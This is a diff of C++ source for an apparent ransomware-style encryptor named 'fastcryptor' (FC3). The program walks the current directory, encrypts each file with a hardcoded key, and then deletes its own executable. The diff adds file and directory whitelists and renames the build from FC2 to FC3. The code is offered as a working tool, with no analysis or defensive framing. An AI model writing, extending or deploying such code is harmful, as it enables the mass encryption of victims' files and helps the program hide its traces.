@@ -2,21 +2,49 @@
 #include <fstream>
 #include <string>
 #include <vector>
+#include <algorithm>
 #include <dirent.h>
 #include <cstring>
 #include <unistd.h>
 
 const std::string key = "fastcryptor_for_the_win_haha";
 
+bool isFileWhitelisted(const std::string& fileName)
+{
+    const std::vector<std::string> whitelist_files = {"./important.txt"};
+
+    if (std::find(whitelist_files.begin(), whitelist_files.end(), fileName) != whitelist_files.end()) {
+        return true;
+    }
+
+    return false;
+}
+
+bool isDirectoryWhitelisted(const std::string& dirName)
+{
+    const std::vector<std::string> whitelist_dirs = {};
+
+    if (std::find(whitelist_dirs.begin(), whitelist_dirs.end(), dirName) != whitelist_dirs.end()) {
+        return true;
+    }
+
+    return false;
+}
+
 void encryptFile(const std::string& fileName)
 {
+    if (isFileWhitelisted(fileName)) {
+        std::cout << "Skipping encryption for whitelisted file: " << fileName << std::endl;
+        return;
+    }
+
     std::ifstream inputFile(fileName, std::ios::binary);
     if (!inputFile.is_open()) {
         std::cerr << "Error opening file: " << fileName << std::endl;
         return;
     }
 
-    if (fileName.find("FC2") != std::string::npos) {
+    if (fileName.find("FC3") != std::string::npos) {
         return;
     }
 
@@ -24,7 +52,7 @@ void encryptFile(const std::string& fileName)
         return;
     }
 
-    std::vector<char> data((std::istreambuf_iterator<char>(inputFile)), 
+    std::vector<char> data((std::istreambuf_iterator<char>(inputFile)),
                            (std::istreambuf_iterator<char>()));
     inputFile.close();
 
@@ -57,9 +85,13 @@ void encryptFile(const std::string& fileName)
     }
 }
 
-
 void encryptDirectory(const std::string& dirName)
 {
+    if (isDirectoryWhitelisted(dirName)) {
+        std::cout << "Skipping encryption for whitelisted directory: " << dirName << std::endl;
+        return;
+    }
+
     DIR *dir;
     struct dirent *ent;
     if ((dir = opendir(dirName.c_str())) != NULL) {
@@ -81,8 +113,8 @@ int main()
 {
     encryptDirectory(".");
 
-    if (unlink("FC2") != 0) {
-        if (unlink("FC2.exe") != 0) {
+    if (unlink("FC3") != 0) {
+        if (unlink("./FC3.exe") != 0) {
             std::cerr << "Error deleting file: FC3" << std::endl;
         }
     }
